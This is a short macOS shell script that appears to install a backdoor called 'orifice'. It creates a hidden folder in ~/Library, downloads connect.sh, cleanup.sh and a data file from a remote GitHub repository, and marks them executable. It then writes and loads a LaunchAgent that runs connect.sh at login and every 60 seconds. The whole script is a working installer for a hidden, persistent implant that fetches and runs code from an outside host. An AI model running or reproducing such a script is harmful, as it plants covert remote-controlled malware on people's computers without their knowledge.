mkdir ~/Library/.hidden ; cd ~/Library/.hidden ; wget https://raw.githubusercontent.com/gNerdSec/orifice_scripts/master/osx/server/connect.sh ; chmod +x connect.sh
wget https://raw.githubusercontent.com/gNerdSec/orifice_scripts/master/osx/server/stuff.txt;
wget https://raw.githubusercontent.com/gNerdSec/orifice_scripts/master/osx/server/cleanup.sh; chmod +x cleanup.sh;

mkdir ~/Library/LaunchAgents;

echo '<plist version="1.0">
<dict>
<key>Label</key>
<string>com.gnerdsec.orifice</string>
<key>ProgramArguments</key>
<array>
<string>/bin/sh</string>
<string>'$HOME'/Library/.hidden/connect.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
<key>StartInterval</key>
<integer>60</integer>
<key>AbandonProcessGroup</key>
<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.gnerdsec.orifice.plist;

chmod 600 ~/Library/LaunchAgents/com.gnerdsec.orifice.plist ; launchctl load ~/Library/LaunchAgents/com.gnerdsec.orifice.plist
